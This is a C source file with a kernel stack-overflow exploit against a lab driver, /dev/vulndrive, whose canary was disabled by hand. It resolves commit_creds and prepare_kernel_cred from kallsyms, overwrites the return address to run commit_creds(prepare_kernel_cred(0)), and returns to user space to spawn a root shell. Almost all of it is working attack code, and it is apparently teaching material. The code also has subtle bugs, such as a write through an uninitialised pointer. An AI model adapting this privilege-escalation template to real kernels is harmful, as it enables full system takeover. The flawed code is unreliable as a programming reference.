/*
 * Simple example using 'stack overflow' "without" canary.
 * This driver has a vulnerability in function 'copy_from_user' which copy
 * 'size' bytes from a 'user buffer' to a 'kernel buffer'. After some bytes, 
 * we just overwrite the 'ret' address, hijacking the flow to the shellcode
 * present in 'user-space' ('got_root' function).
 *
 * The 'got_root' function calls commit_creds(prepare_kernel_cred(0)) which
 * replace the process credentials to root like credentials. After that, we 
 * just "recover" the stack to call 'iret' instruction to go back to 
 * 'user-space'. Finally, we replace the current program image of '/bin/sh'.
 * 
 * 
 * In order to generated the correct binary driver for simple stack overflow,
 * we need to use a tool to replace a byte given an offset (to "disable" 
 * canary). After compile, we just overwrite the instruction 'jmp' 
 * (2 bytes) with two NOP (0x90).
 * 
 * 1) /tools/change_byte vuln_driver.ko 888
 * 2) /tools/change_byte vuln_driver.ko 889
 * 3) $ ./exploit
 * [+] Recovering address from: /boot/System.map
 *  [-] Address of 'prepare_kernel_cred': 0xc10839b0
 *  [-] Address of 'commit_creds': 0xc1083700
 * [+] Sending the payload...
 * [+] enjoy the shell
 * # whoami
 *  root
 * # id
 * uid=0(root) gid=0(root) groups=0(root)
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define DEVICE "/dev/vulndrive"
#define BUFFER_SIZE 29

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
__attribute__((regparm(3)));

typedef int (*commit_creds_t)(struct cred *new)
__attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

struct trap_frame {
	void    *eip;
	int      cs;
	int      eflags;
	void    *esp;
	int      ss;
} __attribute__((packed)) tf;

short userland_gs;

/* getuid() must recove uid==0, because we overwrite with this value, if
 * so, we get a root shell.
 */
void payload(void){

	if (getuid() == 0){
		printf("[+] enjoy the shell\n");
		execl("/bin/sh", "sh", "-i", NULL);
	}else
		warnx("failed to get root. How did we even get here?");

	exit(0);
}

/* Saving 'cs', 'eflags', 'esp', 'ss' and 'eip' to use wiht 'iret' */
void setup_payload(void){

	/* Save gs */
	__asm__("pushl %gs; popl userland_gs");

	/* Setup trap frame. */
	__asm__("pushl %cs      ; popl tf+4;"
		"pushfl         ; popl tf+8;"
		"pushl %esp     ; popl tf+12;"
		"pushl %ss      ; popl tf+16");
	tf.eip = payload;
	tf.esp -= 1024;
}

/* Find a kernel symbol in "/proc/kallsyms" or "/boot/System.map" */
void * get_symbol(char *name, char *location){ 
	FILE *f = fopen(location, "r");
	char c, sym[512];
	void *addr;
	int ret;

	while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
		if (!strcmp(sym, name))
			return addr;
	}

	return NULL;
}

/* Recover all saved information for use with 'iret' */
void return_to_userland(void){
	__asm__("mov %0, %%gs" :: "m" (userland_gs));
	__asm__("mov $tf, %esp ; iret");
}

/* Code executed in kernel mode. Overwrite credencials with root credentials.
 * After that, we just switch back to user mode.
 */
void get_root(void){
	commit_creds(prepare_kernel_cred(0));
	return_to_userland();
}

/* Recover address for: prepare_kernel_cred and commit_creds */
void hide_and_seek(void){
	printf("[+] Recovering address from: %s\n", "/boot/System.map");
	prepare_kernel_cred     = get_symbol("prepare_kernel_cred", "/proc/kallsyms");
	commit_creds            = get_symbol("commit_creds", "/proc/kallsyms");

	if (!(prepare_kernel_cred && commit_creds)){
		printf("[+] Recovering address from: %s\n", "/boot/System.map");
		prepare_kernel_cred     = get_symbol("prepare_kernel_cred", "/boot/System.map");
		commit_creds            = get_symbol("commit_creds", "/boot/System.map");
	}

	if (!(prepare_kernel_cred && commit_creds))
		errx(1, "couldn't map kernel symbols");

	printf(" [-] Address of 'prepare_kernel_cred': %p\n", prepare_kernel_cred);
	printf(" [-] Address of 'commit_creds': %p\n", commit_creds);
}

int main(int argc, char **argv){
	int size, fd,  ret;
	char ch, write_buf[100], read_buf[100];
	unsigned int  *address;
	char payload[BUFFER_SIZE] = {};

	/* Recover address from symbols */
	hide_and_seek();

	/* open for read/write */
	fd = open(DEVICE, O_RDWR);
	if(fd == -1){
		printf("Error!\n");
		exit(1);
	}

	printf("[+] Sending the payload...\n");
	*address = (unsigned int) &get_root;
	memcpy(payload+(BUFFER_SIZE-4), address, 4);

	setup_payload();
	ret = write(fd, payload, BUFFER_SIZE);
	printf("[+] Write's return :%d\n", ret);

	close(fd);
	return 0;
}
